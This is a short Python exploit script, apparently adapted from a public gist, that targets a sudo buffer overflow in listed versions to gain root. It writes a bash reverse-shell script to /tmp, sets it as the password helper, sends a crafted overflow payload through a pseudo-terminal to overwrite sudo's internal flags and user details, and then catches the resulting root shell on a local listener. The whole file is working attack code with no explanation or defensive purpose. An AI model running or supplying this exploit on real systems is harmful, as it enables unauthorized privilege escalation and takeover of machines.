#!/usr/bin/python
###
# From https://gist.github.com/wbowling/cfe7f13f002e33e1f46acf44c7c80129
# Slightly modified
###

import os, stat
import pty

from pwn import process, sleep, write, read, listen, p64

script = """#!/bin/bash
    bash -i >& /dev/tcp/127.0.0.1/12345 0>&1
"""

filename = "/tmp/pwn.sh"

OFFSETS = {
    "1.8.21": 0x270, # 624
    "1.8.30": 0x224  # 548
}
VERSION = "1.8.21"


def setup():
    write(filename, script)
    os.chmod(filename, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)


def exploit():
    mfd, sfd = pty.openpty()

    r = listen(12345)
    process("sudo -S id < " + os.ttyname(sfd),
            shell=True, env={"SUDO_ASKPASS": filename})

    payload1 = "\x00" * OFFSETS[VERSION]
    payload1 += p64(0xf4)   # tgetpass_flags, 244
    payload1 += p64(0) * 6  # user_details
    payload1 += "\n"

    payload = ""
    for c in payload1:
        payload += c
        if (len(payload) + 1) % 0xf0 == 0: # 240
            payload += "\x15"  # sudo_term_kill char

    sleep(1)
    os.write(mfd, payload)
    r.wait_for_connection()
#    r.interactive()
    r.sendline(b'id -a')
    print("%s" % r.recvline(keepends=False))
    print("%s" % r.recvline(keepends=False))
    r.sendline(b'exit')


if __name__ == "__main__":
    setup()
    exploit()
